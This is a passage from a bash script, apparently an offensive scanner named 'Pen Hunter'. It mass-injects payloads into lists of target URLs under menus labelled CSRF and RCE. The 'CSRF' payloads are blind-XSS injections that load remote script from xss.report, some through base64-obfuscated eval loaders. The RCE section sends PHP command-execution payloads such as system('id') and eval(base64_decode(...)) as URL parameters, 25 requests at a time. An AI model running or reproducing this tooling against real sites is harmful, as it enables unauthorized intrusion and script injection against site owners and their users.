              full_url="${url}${manual_payload}"
              response=$(curl -s --max-time 10 "$full_url")
              if echo "$response" | grep -qi "${manual_payload}"; then
                echo -e "${GREEN}VULN: ${url}${NC}"
                echo "Injected URL: $full_url"
              fi
            done
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
              break
            fi
          elif [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
            echo "Exiting..."
            break
          else
            echo -e "${RED}Invalid choice. Exiting.${NC}"
            break 
          fi
        done
      elif [ "$choice" = "csrf" ] || [ "$choice" = "cf" ] || [ "$choice" = "6" ]; then
        while true; do
          clear
          echo -e "${PURPLE}${acsii}${NC}"
          echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
          echo -e "${PURPLE}CSRF Pen Hunter:${NC} ${PURPLE}\n 1-Pen Hunter CSRF\n 2-CSRF-Tester(T) to use a CSRF testing tool\n 3-Manual CSRF test(M)\n 9-(Type 'exit' or 'x' to exit)"
          #tmux new-session -d -s csrf
          echo -e "${RED}tmux create session csrf to see:${NC} tmux a -t csrf "
          read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
          if [ "$choice" = "penhunter" ] || [ "$choice" = "p" ] || [ "$choice" = "1" ]; then
            echo -e "${GREEN}Penhunter search for CSRF: $full_path_target...wait${NC}"

            payloads=(
                '<script src=https://xss.report/c/YOUR xss.report></script>'
                '<img src=https://xss.report/c/YOUR xss.report onerror=alert(1);>'
                '<img src=https://xss.report/c/YOUR xss.report id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLn>'
                '<input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzL>'
                '<video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzO>'
                '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", //x>'
                '<script>$.getScript("//xss.report/c/YOUR xss.report")</script>'
                'var a=document.createElement(script);a.src=https://xss.report/c/YOUR xss.report;document.body.appendChild(a;'
                '<input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2h4MCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; autofocus>'
            )
            
            load_urls() {
                mapfile -t urls < "$1"
                echo "${urls[@]}"
            }
            
            check_csrf() {
                url="$1"
                for payload in "${payloads[@]}"; do
                    full_url="${url}${payload}"
                    response=$(curl -s --max-time 10 -d "$payload" "$full_url")
                    if echo "$response" | grep -qi "success\|completed"; then
                        echo -e "${GREEN}VULN: ${url}${NC}"
                        echo "Injected URL: $full_url"
                        return
                    fi
                done
            }
            
            main() {
                url_file="$full_path_target"
                max_concurrent_requests=25
                current_requests=0

                if [ -z "$url_file" ]; then
                    echo -e "No URL list file specified."
                    exit 1
                fi

                urls=($(load_urls "$url_file"))

                if [ ${#urls[@]} -eq 0 ]; then
                    echo -e "No URLs provided to test."
                    exit 1
                fi

                for url in "${urls[@]}"; do
                    if (( current_requests >= max_concurrent_requests )); then
                        wait -n
                        current_requests=$((current_requests - 1))
                    fi
                    check_csrf "$url" &
                    current_requests=$((current_requests + 1))
                done

                wait
            }
            main
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
              break
            fi
          elif [ "$choice" = "csrf-tester" ] || [ "$choice" = "T" ] || [ "$choice" = "2" ]; then
            tmux new-session -d -s csrf && tmux split-window -t csrf && tmux send-keys -t csrf "cat $full_path_target | while read url; do curl -s -I \"$url\" | grep -i \"csrf_token\"; done" C-m
          elif [ "$choice" = "manual" ] || [ "$choice" = "M" ] || [ "$choice" = "3" ]; then
            read -r -p "$(echo -e "${DARK_GREEN}Enter your payload: ${NC}")" manual_payload
            if [[ -z "$manual_payload" ]]; then
              echo -e "${RED}No payload entered. Exiting.${NC}"
              break
            fi
            echo -e "${GREEN}Manual CSRF test with payload: ${manual_payload}${NC}"
            cat $full_path_target | while read url; do
              full_url="${url}${manual_payload}"
              response=$(curl -s --max-time 10 -d "$manual_payload" "$full_url")
              if echo "$response" | grep -qi "success\|completed"; then
                echo -e "${GREEN}VULN: ${url}${NC}"
                echo "Injected URL: $full_url"
              fi
            done
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
              break
            fi
          elif [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
            echo "Exiting..."
            break
          else
            echo -e "${RED}Invalid choice. Exiting.${NC}"
            break 
          fi
        done
      elif [ "$choice" = "rce" ] || [ "$choice" = "rc" ] || [ "$choice" = "7" ]; then
        while true; do
          clear
          echo -e "${BROWN}${acsii}${NC}"
          echo -e "${YELLOW}Using existing target file: ${full_path_target}${NC}"
          echo -e "${BROWN}RCE Pen Hunter:${NC} ${BROWN}\n 1-Pen Hunter RCE\n 2-RCE-Tool(T) to use a dedicated RCE tool\n 3-Manual RCE test(M)\n 9-(Type 'exit' or 'x' to exit)"
          #tmux new-session -d -s rce
          echo -e "${RED}tmux create session rce to see:${NC} tmux a -t rce "
          read -r -p "$(echo -e "${DARK_GREEN}Choice one: ${NC}")" choice
          if [ "$choice" = "penhunter" ] || [ "$choice" = "p" ] || [ "$choice" = "1" ]; then
            echo -e "${GREEN}Penhunter search for RCE: $full_path_target...wait${NC}"

            payloads=(
                '$(command)'
                'phpinfo()'
                'system("id")'
                'exec("id")'
                'passthru("id")'
                'shell_exec("id")'
                'eval(base64_decode("c3lzdGVtKCJpZCIp"))'
                'assert(base64_decode("c3lzdGVtKCJpZCIp"))'
            )
            
            load_urls() {
                mapfile -t urls < "$1"
                echo "${urls[@]}"
            }
            
            check_rce() {
                url="$1"
                for payload in "${payloads[@]}"; do
                    full_url="${url}?input=${payload}"
                    response=$(curl -s --max-time 10 "$full_url")
                    if echo "$response" | grep -qi "uid\|id\|phpinfo"; then
                        echo -e "${GREEN}VULN: ${url}${NC}"
                        echo "Injected URL: $full_url"
                        return
                    fi
                done
            }
            
            main() {
                url_file="$full_path_target"
                max_concurrent_requests=25
                current_requests=0

                if [ -z "$url_file" ]; then
                    echo -e "No URL list file specified."
                    exit 1
                fi

                urls=($(load_urls "$url_file"))

                if [ ${#urls[@]} -eq 0 ]; then
                    echo -e "No URLs provided to test."
                    exit 1
                fi

                for url in "${urls[@]}"; do
                    if (( current_requests >= max_concurrent_requests )); then
                        wait -n
                        current_requests=$((current_requests - 1))
                    fi
                    check_rce "$url" &
                    current_requests=$((current_requests + 1))
                done

                wait
            }
            main
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
              break
            fi
          elif [ "$choice" = "rce-tool" ] || [ "$choice" = "T" ] || [ "$choice" = "2" ]; then
            tmux new-session -d -s rce && tmux split-window -t rce && tmux send-keys -t rce "cat $full_path_target | while read url; do curl -s \"$url\" | grep -i \"id\|phpinfo\"; done" C-m
          elif [ "$choice" = "manual" ] || [ "$choice" = "M" ] || [ "$choice" = "3" ]; then
            read -r -p "$(echo -e "${DARK_GREEN}Enter your payload: ${NC}")" manual_payload
            if [[ -z "$manual_payload" ]]; then
              echo -e "${RED}No payload entered. Exiting.${NC}"
              break
            fi
            echo -e "${GREEN}Manual RCE test with payload: ${manual_payload}${NC}"
            cat $full_path_target | while read url; do
              full_url="${url}?input=${manual_payload}"
              response=$(curl -s --max-time 10 "$full_url")
              if echo "$response" | grep -qi "uid\|id\|phpinfo"; then
                echo -e "${GREEN}VULN: ${url}${NC}"
                echo "Injected URL: $full_url"
              fi
            done
            read -r -p "$(echo -e "${DARK_GREEN}TO Exit press on x: ${NC}")" choice
            if [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
              break
            fi
          elif [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
            echo "Exiting..."
            break
          else
            echo -e "${RED}Invalid choice. Exiting.${NC}"
            break 
          fi
        done
      elif [ "$choice" = "exit" ] || [ "$choice" = "x" ] || [ "$choice" = "9" ]; then
        echo "Exiting..."
        break
      else
      echo -e "${RED}Invalid choice. Exiting.${NC}"
      break
      fi
    done
    echo -e "\n${GREEN}Mission Complete :)${NC}"
  fi
 else
  echo -e "\n${GREEN}Mission Complete :)${NC}"
fi